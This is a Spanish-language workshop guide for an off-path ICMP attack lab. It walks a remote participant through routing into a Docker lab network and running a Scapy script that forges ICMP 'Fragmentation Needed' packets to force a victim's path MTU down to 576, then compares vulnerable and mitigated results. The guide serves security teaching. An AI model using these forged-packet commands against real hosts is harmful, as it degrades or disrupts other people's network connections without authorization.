# Punto 08 — Guía del atacante remoto (sin SSH)

Forja ICMP *Fragmentation Needed* hacia la víctima `10.9.0.20` desde **tu PC**. Necesitas el repo, Python 3, Scapy y estar en la misma red que el operador.

---

## Datos del operador

| Dato | Ejemplo |
|------|---------|
| IP LAN del host | `10.203.2.231` |
| Puerto servidor (curl) | `8080` |

El operador debe tener el lab levantado, la víctima en marcha y haber ejecutado `sudo ../../lib/lan-expose.sh`.

---

## Requisitos en tu PC

```bash
pip install scapy
# o: pip3 install scapy --user
```

Los scripts de ataque requieren **root** (sockets raw):

```bash
sudo python3 ...
```

---

## Paso 1 — Ruta hacia la red del laboratorio

Sustituye `<IP_HOST>` por la IP LAN del operador:

```bash
sudo ip route add 10.9.0.0/24 via <IP_HOST>
```

Comprueba:

```bash
ping -c 2 <IP_HOST>
ping -c 2 10.9.0.20
curl --max-time 5 http://<IP_HOST>:8080/
```

`curl` debe devolver `OK`. `ping 10.9.0.20` debe responder si el operador ejecutó `lan-expose.sh`.

---

## Paso 2 — Lanzar el ataque ICMP forjado

Desde tu copia del repo:

```bash
cd punto-08-icmp-off-path/vulnerable/scripts
sudo python3 forge_icmp_mtu.py 10.9.0.20 10.9.0.20 10.9.0.30 45678 8080 1 576
```

Salida esperada:

```
[+] ICMP Type3/Code4 forjado hacia 10.9.0.20 (MTU=576)
```

---

## Paso 3 — Comprobar resultado

Tú no puedes ver la ruta de la víctima directamente. Pide al operador que ejecute:

```bash
docker compose exec victima ip route get 10.9.0.30
```

| Modo | Resultado |
|------|-----------|
| Vulnerable | Aparece `mtu 576` |
| Mitigado | MTU normal |

---

## Al terminar (tu PC)

```bash
sudo ip route del 10.9.0.0/24 via <IP_HOST>
```

---

## Resumen

```bash
sudo ip route add 10.9.0.0/24 via <IP_HOST>
curl http://<IP_HOST>:8080/
cd punto-08-icmp-off-path/vulnerable/scripts
sudo python3 forge_icmp_mtu.py 10.9.0.20 10.9.0.20 10.9.0.30 45678 8080 1 576
```

---

## Solución de problemas

| Problema | Solución |
|----------|----------|
| `ping 10.9.0.20` no responde | Operador: `sudo ../../lib/lan-expose.sh` tras `compose up` |
| `curl :8080` falla | Operador: lab levantado + `firewall-cmd --add-port=8080/tcp` |
| `Permission denied` en script | Usa `sudo python3` |
| `ModuleNotFoundError: scapy` | `pip install scapy` |

---

## Aviso

Solo en la red del taller y con autorización.
